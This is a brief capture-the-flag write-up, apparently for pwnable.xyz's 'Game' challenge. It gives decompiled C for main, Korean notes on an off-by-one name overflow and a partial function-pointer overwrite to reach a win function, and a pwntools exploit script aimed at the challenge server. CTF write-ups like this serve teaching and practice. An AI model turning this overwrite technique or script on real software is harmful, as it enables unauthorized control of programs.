# Game
*
~~~c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  signed int v3; // eax

  setup(*(_QWORD *)&argc, argv, envp);
  puts("Shell we play a game?");
  init_game();
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      printf("> ");
      v3 = read_int32();
      if ( v3 != 1 )
        break;
      (*((void (**)(void))cur + 3))();
    }
    if ( v3 > 1 )
    {
      if ( v3 == 2 )
      {
        save_game();
      }
      else
      {
        if ( v3 != 3 )
          goto LABEL_13;
        edit_name();
      }
    }
    else
    {
      if ( !v3 )
        exit(1);
LABEL_13:
      puts("Invalid");
    }
  }
}
~~~
IDA에서 확인한 main code , win의 주소는 0x4009d6
* exploit 방법은 name을 물을 때 16자리를 꽉 채워서 보내서 널 바이트를 없애 길이를 한칸 길게 함.
다음 1번 조건에서 져서 score를 -1로 저장되게 함. 그 상태에서 2번 조건 실행해서 0xffffffffffffffff가 score에
저장하게 함. 이제 3번을 실행해서 뒷부분 3자리를 win의 주소로 바꾸어줌. 그러면 1번을 실행할 때마다 win이 실행됨
~~~python 
from pwn import *

p=remote('svc.pwnable.xyz',30009)
e=ELF('./game')

p.sendafter('Name: ','A'*16)

p.sendlineafter('> ','1')
p.sendlineafter('= ','1')

p.sendlineafter('> ','2')

p.sendlineafter('> ','3')
ex='A'*24+'\xd6\x09'
p.send(ex)

p.sendlineafter('> ','1')

p.interactive()
~~~
  
